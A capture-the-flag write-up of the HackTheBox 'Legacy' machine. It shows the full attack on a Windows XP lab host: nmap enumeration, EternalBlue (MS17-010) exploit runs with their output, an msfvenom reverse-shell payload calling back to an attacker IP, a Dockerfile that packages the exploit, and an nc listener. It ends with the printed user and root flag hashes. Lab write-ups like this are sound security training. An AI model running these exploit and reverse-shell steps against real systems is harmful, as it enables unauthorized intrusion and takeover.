---
title: "Legacy"
---

:::info

Description: This is a write-up for the Legacy Box on [HackTheBox](https://hackthebox.com).

Credits: S/o to Sno0wCS for the collab session on this box.

|OS|Level|Rating
|:---:|:-----:|:-----:|
|Windows &#xf17a;|Easy|&#xf058; &#xf058; &#xf058; &#xf058;|

:::

## RECON

### scan

first run of nmap:

```bash
# Nmap 7.92 scan initiated Mon Mar 14 09:16:06 2022 as: nmap -v -Pn -p- -o nmap-legacy.txt 10.10.10.4
Nmap scan report for 10.10.10.4
Host is up (0.23s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE  SERVICE
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Mar 14 09:27:25 2022 -- 1 IP address (1 host up) scanned in 679.20 seconds
```

We can see the classic 139,445 port combo that tells us SMB is in the house, so we scan them.

### enumerate

First `--script smb-enum-shares`:

```bash
└─$ nmap --script smb-enum-shares -p 139,445 10.10.10.4 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-14 09:37 NZDT
Nmap scan report for 10.10.10.4
Host is up (0.25s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\10.10.10.4\ADMIN$: 
|     warning: Couldnt get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.4\C$: 
|     warning: Couldnt get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.4\IPC$: 
|     warning: Couldnt get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: READ

Nmap done: 1 IP address (1 host up) scanned in 375.21 seconds
```

then, `--script smb-vuln*`:

```bash
└─$ nmap --script smb-vuln* -p 139,445 10.10.10.4 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-14 09:38 NZDT                                                    
Nmap scan report for 10.10.10.4                                                                                     
Host is up (0.70s latency).                                                                                         
                                                                                                                    
PORT    STATE SERVICE                                                                                               
139/tcp open  netbios-ssn                                                                                           
445/tcp open  microsoft-ds                                                                                          
                                                                                                                    
Host script results:                                                                                                
| smb-vuln-ms17-010:                                                                                                
|   VULNERABLE:                                                                                                     
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)                                       
|     State: VULNERABLE                                                                                             
|     IDs:  CVE:CVE-2017-0143                                                                                       
|     Risk factor: HIGH                                                                                             
|       A critical remote code execution vulnerability exists in Microsoft SMBv1                                    
|        servers (ms17-010).                                                                                        
|                                                                                                                   
|     Disclosure date: 2017-03-14                                                                                   
|     References:                                                                                                   
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx                                          
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143                                                
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/               
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)                                               
|_smb-vuln-ms10-054: false 
```

We got a hit! Looks like the ol' EternalBlue exploit!

## EXPLOIT

### searchsploit

Run `searchsploit` to find an exploit to use:

```bash
searchsploit eternalblue
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)  | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code E | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution ( | windows_x86-64/remote/42030.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

I downloaded both `42031.py` and `42315.py` exploits and tried to get them working, but kept running into issues with python2 vs python3 dependencies.

So off to the internet I go to find some existing exploit setups.

### AutoBlue Script

I did a quick search online and found [AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010):

:::info requirements

Check the repo for requirements for the scripts.

:::

I tried the the following scripts first, but all said the host didn't support that exploit:

* `eternalblue_exploit7.py`
* `eternalblue_exploit8.py`
* `eternalblue_exploit10.py`

Only `zzz_exploit.py` that worked for me on this box:

```bash
└─$ python3 zzz_exploit.py 10.10.10.4                                                                           2 ⨯
[*] Target OS: Windows 5.1
[+] Found pipe 'browser'
[+] Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x822d7da8
SESSION: 0xe22f3c18
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
[*] make this SMB session to be SYSTEM
[+] current TOKEN addr: 0xe1b761c0
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe1b76260
[*] overwriting token UserAndGroups
[*] have fun with the system smb session!
[!] Dropping a semi-interactive shell (remember to escape special chars with ^) 
[!] Executing interactive programs will hang shell!
C:\WINDOWS\system32>
```

Awesome, we have a shell!

What can we do? Let's find the user flag:

```bash
C:\WINDOWS\system32>net user

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Guest                    HelpAssistant            
john                     SUPPORT_388945a0         
The command completed with one or more errors.


C:\WINDOWS\system32>cd C:\Users\john
ERROR:root:You cant CD under SMBEXEC. Use full paths.
C:\WINDOWS\system32>

C:\WINDOWS\system32>net use
New connections will be remembered.

There are no entries in the list.


C:\WINDOWS\system32>net session

Computer               User name            Client Type       Opens Idle time

-------------------------------------------------------------------------------
\\10.10.16.4                                posix                 2 00:00:00    
\\127.0.0.1                                 Windows 2002 Serv     2 00:00:00    
The command completed successfully.
```

After trying a few things, I managed to add an Administrator user but that didn't really work out to anything, so I thought I'd try and get a better shell.

### manual exploitation

After several hours of python dependency hell, I looked up how people were exploiting an XP machine, manually, with these python2 scripts that are everywhere and came across this blog post: ["Exploiting MS17-010 without Metasploit (Win XP SP3)"](https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/)

And this was the first time seeing someone use the `send_and_execute.py` script, so I thought I'd give it a go.

:::tip send and execute

The basic idea with `send_and_execute.py` is using EternalBlue exploit to send a file to our target (e.g. a reverse shell executable), and then run it on the target e.g. if it's a reverse shell executable, it will call back to the LHOST we generated the shellcode with.

:::

I copied the following scripts to their own folder (clean workspace):

* `send_and_execute.py`
* `mysmb.py`
* `zzz_exploit.py` - in case this method bombs out as well lol.

I generate my reverse shell *.exe with: 

* `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe`

```bash
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: ms17-010.exe
```

Let's run it and see what happens:

```bash
┌──(rxhackk㉿kali)-[~/…/HTB/BOXES/LEGACY/working]-[tun0: 10.10.16.2]
└─$ ./send_and_execute.py 10.10.10.4 ms17-010.exe
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
Traceback (most recent call last):
  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/working/./send_and_execute.py", line 1077, in <module>
    exploit(target, port, pipe_name)
  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/working/./send_and_execute.py", line 839, in exploit
    if not info['method'](conn, pipe_name, info):
  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/working/./send_and_execute.py", line 641, in exploit_fish_barrel
    conn.send_trans_secondary(mid=info['fid'], data='\x00', dataDisplacement=NEXT_TRANS_OFFSET+tinfo['TRANS_MID_OFFSET'])
  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/working/mysmb.py", line 309, in send_trans_secondary
    self.send_raw(self.create_trans_secondary_packet(mid, param, paramDisplacement, data, dataDisplacement, pid, tid, noPad))
  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/working/mysmb.py", line 305, in create_trans_secondary_packet
    _put_trans_data(transCmd, param, data, noPad)
  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/working/mysmb.py", line 83, in _put_trans_data
    transData += (b'\x00' * padLen) + data
TypeError: can't concat str to bytes
```

Crap- I'm running the script as `#!/usr/bin/env python3` and the script itself was written for python2, so we're still in this python dependency hell. Annoying.

No matter, DevOps Engineering skills to the rescue:

### custom solution

The idea here is to pack everything into a python2 image base, install all the python2 dependencies, and run the python2 scripts from inside a fully dependant container.

```docker
FROM python:2.7

# update pip
RUN pip install --upgrade pip

# install dependencies for the env
RUN pip install ldap3==2.5.1 \
    future \
    dnspython \
    cryptography==2.3 \
    MarkupSafe==0.23

# set the working directory
WORKDIR /app

# copy our files from host to container
COPY ms17-010.exe send_and_execute.py mysmb.py /app/ 

# download & install impacket
RUN git clone https://github.com/SecureAuthCorp/impacket.git
RUN cd impacket && python2 -m pip install .

# set our command to run when the container is run
CMD ["/usr/local/bin/python", "./send_and_execute.py", "10.10.10.4", "./ms17-010.exe"]
```

Build our container: `docker build -t bluexp .`

Set up the listener ready for the callback: `sudo rlwrap nc -lnvp 443`

Now run it:

```bash
──(rxhackk㉿kali)-[~/…/HTB/BOXES/LEGACY/workingv2]-[tun0: 10.10.16.2]
└─$ docker run -it bluexp
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x81f19cb0
SESSION: 0xe11b7bd8
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe17d91b0
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe17d9250
overwriting token UserAndGroups
Sending file C1HC8I.exe...
Opening SVCManager on 10.10.10.4.....
Creating service CmRK.....
Starting service CmRK.....
The NETBIOS connection with the remote host timed out.
Removing service CmRK.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done
```

And while we are watching the listener in another terminal...

Success!

```bash
┌──(rxhackk㉿kali)-[~]-[tun0: 10.10.16.2]
└─$ sudo rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.4] 1032
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

## FLAGS

### user.txt

Let's find the user flag:

```bash
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john

16/03/2017  08:33 ��    <DIR>          .
16/03/2017  08:33 ��    <DIR>          ..
16/03/2017  09:19 ��    <DIR>          Desktop
16/03/2017  08:33 ��    <DIR>          Favorites
16/03/2017  08:33 ��    <DIR>          My Documents
16/03/2017  08:20 ��    <DIR>          Start Menu
               0 File(s)              0 bytes
               6 Dir(s)   6.313.111.552 bytes free

dir john\Desktop
dir john\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\john\Desktop

16/03/2017  09:19 ��    <DIR>          .
16/03/2017  09:19 ��    <DIR>          ..
16/03/2017  09:19 ��                32 user.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.313.111.552 bytes free

type john\Desktop\user.txt
type john\Desktop\user.txt
e69af0e4f443de7e36876fda4ec7644f
C:\Documents and Settings>
```

### root.txt

Thought I would need `winpeas.exe` to scan the box for possible privesc.

Thanks to my work mate Duane aka `th3rock_` who dropped by the stream and showed me this cool technique.

Run your own `smbserver` instead of a webserver, which you can then use like a remote NFS share to download tools from, and output logs to so your attack files never touch the target machines disk.

On my attack machine (kali), inside the dir I want to serve, run `impacket-smbserver`:

```bash
┌──(rxhackk㉿kali)-[~/…/winPEAS/winPEASexe/binaries/Release]-[tun0: 10.10.16.2]
└─$ impacket-smbserver  tools .           
Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.4,1038)
[*] AUTHENTICATE_MESSAGE (\,LEGACY)
[*] User LEGACY\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[-] TreeConnectAndX not found WINPEASANY.EXE
[*] Closing down connection (10.10.10.4,1038)
[*] Remaining connections []
[*] Incoming connection (10.10.10.4,1041)
[*] AUTHENTICATE_MESSAGE (\,LEGACY)
[*] User LEGACY\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[-] Unknown level for query path info! 0x109
```

Over on my reverse shell setup by my `bluexp` eternalblue docker container, I can do this to copy `winpeasany.exe` to the Windows machine: 

* `copy \\$ip\$dir\winpeasany.exe c:\winpeasany.exe`

Run winpeas but stdout to file back on your smbshare:

* `c:.\winpeasany.exe > \\$ip\$dir\winpeas.log`

I tried a few other things to get winpeas working, before I realized...

I didn't even need to privesc cos I could get to the Administrator files already:

```bash
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\Documents and Settings\Administrator\Desktop

16/03/2017  09:18     <DIR>          .
16/03/2017  09:18     <DIR>          ..
16/03/2017  09:18                 32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   6.398.578.688 bytes free

type root.txt
type root.txt
993442d258b0e0ec917cae9e695d5713
C:\Documents and Settings\Administrator\Desktop>
```

Important lesson here to always check assumptions- I assumed I wouldn't have admin/root yet, but never confirmed that was the case.

Success and my very first HTB box completed.

## Troubleshooting, Errors, Notes

### python2 impacket issues

the dilemma:

```sh
└─$ python3 zzz_exploit.py 10.10.10.4                                                                               
Target OS: Windows 5.1                                                                                              
Using named pipe: browser                                                                                           
Groom packets
Traceback (most recent call last):
  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/zzz_exploit.py", line 1064, in <module>
    exploit(target, port, pipe_name)
  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/zzz_exploit.py", line 835, in exploit
    if not info['method'](conn, pipe_name, info):
  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/zzz_exploit.py", line 612, in exploit_fish_bar
rel
    conn.send_trans('', mid=mid, param=trans_param, totalParameterCount=0x100-TRANS_NAME_LEN, totalDataCount=0xec0, 
maxParameterCount=0x40, maxDataCount=0)
  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/mysmb.py", line 262, in send_trans
    self.send_raw(self.create_trans_packet(setup, param, data, mid, maxSetupCount, totalParameterCount, totalDataCou
nt, maxParameterCount, maxDataCount, pid, tid, noPad))
  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/mysmb.py", line 258, in create_trans_packet
    _put_trans_data(transCmd, param, data, noPad)
  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/mysmb.py", line 73, in _put_trans_data
    transData = ('\x00' * padLen) + parameters
TypeError: can only concatenate str (not "bytes") to str
```

or env doesnt' wanna know about python2

```sh
└─$ ./zzz_exploit.py 10.10.10.4                                                                                 1 ⨯
Traceback (most recent call last):
  File "./zzz_exploit.py", line 2, in <module>
    from impacket import smb, smbconnection
ImportError: No module named impacket
```

### move to python3

fix `./checker.py` with:

```python
#!/usr/bin/env python3
```

at the top.

```sh
└─$ ./checker.py 10.10.10.4                                                                                     1 ⚙
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Traceback (most recent call last):
  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/./checker.py", line 65, in <module>
    recvPkt = conn.send_trans(pack('<H', TRANS_PEEK_NMPIPE), maxParameterCount=0xffff, maxDataCount=0x800)
  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/mysmb.py", line 262, in send_trans
    self.send_raw(self.create_trans_packet(setup, param, data, mid, maxSetupCount, totalParameterCount, totalDataCount, maxParameterCount, maxDataCount, pid, tid, noPad))
  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/mysmb.py", line 259, in create_trans_packet
    return self.create_smb_packet(transCmd, mid, pid, tid)
  File "/home/kali/Documents/RxHack/HTB/BOXES/LEGACY/exploit/MS17-010/mysmb.py", line 229, in create_smb_packet
    req = str(pkt)
TypeError: __str__ returned non-string (type bytes)
```

Clearly the answer to all dependency-hell problems, is containers. Amen.
